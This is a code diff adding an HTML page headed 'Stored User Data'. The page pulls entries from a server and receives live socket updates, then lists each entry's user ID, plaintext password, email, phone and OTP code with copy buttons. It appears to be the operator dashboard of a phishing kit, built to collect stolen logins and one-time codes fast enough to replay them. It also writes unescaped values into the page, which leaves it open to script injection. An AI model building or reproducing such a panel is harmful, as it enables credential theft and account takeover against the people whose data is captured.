@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Stored Data</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 20px;
+        }
+        .display-section {
+            background-color: #f8f8f8;
+            padding: 10px;
+            border-radius: 5px;
+            margin-top: 20px;
+        }
+        .print-btn {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            background-color: #ffd700;
+            color: #0055a4;
+            border: none;
+            padding: 10px 20px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        .copy-btn {
+            background-color: #0055a4;
+            color: white;
+            border: none;
+            padding: 5px 10px;
+            cursor: pointer;
+            font-weight: bold;
+            border-radius: 5px;
+            margin-left: 10px;
+        }
+    </style>
+</head>
+<body>
+    <button class="print-btn" onclick="window.print()">Print as PDF</button>
+    <h2>Stored User Data</h2>
+    <div class="display-section" id="displaySection">
+        <!-- Stored data will appear here -->
+    </div>
+    <script src="/socket.io/socket.io.js"></script>
+    <script>
+        const socket = io();
+
+        function copyToClipboard(text) {
+            navigator.clipboard.writeText(text).then(() => {
+                alert('Copied to clipboard');
+            }, err => {
+                console.error('Could not copy text: ', err);
+            });
+        }
+
+        function displayData(data) {
+            const displaySection = document.getElementById('displaySection');
+            displaySection.innerHTML = data.map(entry => `
+                <p>User ID: ${entry.userId} <button class="copy-btn" onclick="copyToClipboard('${entry.userId}')">Copy</button></p>
+                <p>Password: ${entry.password} <button class="copy-btn" onclick="copyToClipboard('${entry.password}')">Copy</button></p>
+                <p>Email: ${entry.email || 'N/A'} <button class="copy-btn" onclick="copyToClipboard('${entry.email || 'N/A'}')">Copy</button></p>
+                <p>Phone: ${entry.phone || 'N/A'} <button class="copy-btn" onclick="copyToClipboard('${entry.phone || 'N/A'}')">Copy</button></p>
+                <p>OTP: ${entry.otp || 'N/A'} <button class="copy-btn" onclick="copyToClipboard('${entry.otp || 'N/A'}')">Copy</button></p>
+                <hr>
+            `).join('');
+        }
+
+        socket.on('dataUpdated', displayData);
+
+        // Fetch data on page load
+        fetch('/data')
+            .then(response => response.json())
+            .then(data => displayData(data))
+            .catch(error => console.error('Error:', error));
+    </script>
+</body>
+</html>
